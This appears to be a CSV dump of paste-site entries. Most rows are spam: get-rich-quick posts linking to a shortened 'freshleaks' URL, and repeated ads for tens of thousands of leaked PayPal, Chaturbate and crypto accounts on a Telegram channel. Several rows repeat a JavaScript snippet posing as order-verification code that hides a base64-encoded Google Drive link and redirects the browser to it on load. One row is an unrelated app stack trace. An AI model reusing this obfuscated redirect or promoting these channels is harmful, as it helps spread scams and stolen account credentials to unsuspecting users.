id,title,username,language,date,content
mjcaTYJF,EARN $900 INSTANTLY 2025⭐ GV,Roblox-hacks123,JavaScript,Monday 28th of April 2025 01:11:46 AM CDT," 
Pdf https://tinyurl.com/freshleaks

hqcYfWXKFQ
"
CStCfVzk,PayPal with Balance,rodrigomaise99,JavaScript,Monday 28th of April 2025 01:08:43 AM CDT,18864 Accounts Posted On https://t.me/leakedbyem1nem
m76nsaxG,2025-04-28T00:07:39.975045,powerampache,PHP,Monday 28th of April 2025 01:07:40 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Hostname tomobobo.ddns.net not verified:
    certificate: sha256/zcWhXdiNxGALzoNUwytMz8u3pYoSYABrqp2qvQUKuco=
    DN: CN=tomobobo.linkpc.net
    subjectAltNames: [tomobobo.linkpc.net]"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Hostname tomobobo.ddns.net not verified:\n    certificate: sha256/zcWhXdiNxGALzoNUwytMz8u3pYoSYABrqp2qvQUKuco\u003d\n    DN: CN\u003dtomobobo.linkpc.net\n    subjectAltNames: [tomobobo.linkpc.net]\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Hostname tomobobo.ddns.net not verified:\n    certificate: sha256/zcWhXdiNxGALzoNUwytMz8u3pYoSYABrqp2qvQUKuco\u003d\n    DN: CN\u003dtomobobo.linkpc.net\n    subjectAltNames: [tomobobo.linkpc.net]\"" }"",""stackTrace"":[]}"
94r4tNmb,Products.js,Xp_Isolation,JavaScript,Monday 28th of April 2025 01:07:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77547/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HcF6xK3T,Make $1000 15-MINUTES  (BEGINNER) YR,Roblox-hacks123,JavaScript,Monday 28th of April 2025 01:02:25 AM CDT," 
Pdf https://tinyurl.com/freshleaks

vKz7Z6MraX
"
XGASruKX,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Monday 28th of April 2025 12:53:21 AM CDT,17980 Accounts Posted On https://t.me/leakedbyem1nem
UF8TcaX1,EARN $900 INSTANTLY 2025 95,Roblox-hacks123,JavaScript,Monday 28th of April 2025 12:53:08 AM CDT," 
Pdf https://tinyurl.com/freshleaks

kaBVmX1lMI
"
T7SedTTh,Order.js,Xp_Isolation,JavaScript,Monday 28th of April 2025 12:51:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/85857/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2gz3rtVs,Make $1000 15-MINUTES (BEGINNER) L4,Roblox-hacks123,JavaScript,Monday 28th of April 2025 12:43:52 AM CDT," 
Pdf https://tinyurl.com/freshleaks

1Bq7Gb65F2
"
F9SRLjiN,Chaturbate with Tokens,rodrigomaise99,JavaScript,Monday 28th of April 2025 12:37:59 AM CDT,42750 Accounts Posted On https://t.me/leakedbyem1nem
xep30VA6,Market.js,Xp_Isolation,JavaScript,Monday 28th of April 2025 12:36:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70156/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JwZvbxyg,EARN $900 INSTANTLY 2025⭐ GV,Roblox-hacks123,JavaScript,Monday 28th of April 2025 12:34:33 AM CDT," 
Pdf https://tinyurl.com/freshleaks

dzmdKFT52c
"
Pb0da9q3,EARN $900 INSTANTLY 2025 95,Kanashi401,JavaScript,Monday 28th of April 2025 12:34:25 AM CDT," 
Pdf https://tinyurl.com/freshleaks

pYOEsWUqSP
"
TmQWmyHT,Make $1000 15-MINUTES (BEGINNER) L4,Kanashi401,JavaScript,Monday 28th of April 2025 12:25:06 AM CDT," 
Pdf https://tinyurl.com/freshleaks

EgtZaNOawH
"
5CUVC9FE,Crypto Accounts,rodrigomaise99,JavaScript,Monday 28th of April 2025 12:22:37 AM CDT,23544 Accounts Posted On https://t.me/leakedbyem1nem
Qzr2np37,Untitled,Xp_Isolation,JavaScript,Monday 28th of April 2025 12:21:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84022/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rGk3SRSv,EARN $900 INSTANTLY 2025⭐ GV,Kanashi401,JavaScript,Monday 28th of April 2025 12:15:45 AM CDT," 
Pdf https://tinyurl.com/freshleaks

t5PSiXGFii
"
fLPKVJZT,PayPal with Balance,rodrigomaise99,JavaScript,Monday 28th of April 2025 12:07:15 AM CDT,90707 Accounts Posted On https://t.me/leakedbyem1nem
CQP9qm96,Products.js,Xp_Isolation,JavaScript,Monday 28th of April 2025 12:05:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23466/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PxJrf0Wi,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Sunday 27th of April 2025 11:51:53 PM CDT,71400 Accounts Posted On https://t.me/leakedbyem1nem
w8MTaQsQ,Order.js,Xp_Isolation,JavaScript,Sunday 27th of April 2025 11:50:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41794/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8kTWKpR5,Chaturbate with Tokens,rodrigomaise99,JavaScript,Sunday 27th of April 2025 11:36:31 PM CDT,53596 Accounts Posted On https://t.me/leakedbyem1nem
ezD4aDLM,Market.js,Xp_Isolation,JavaScript,Sunday 27th of April 2025 11:35:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89865/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
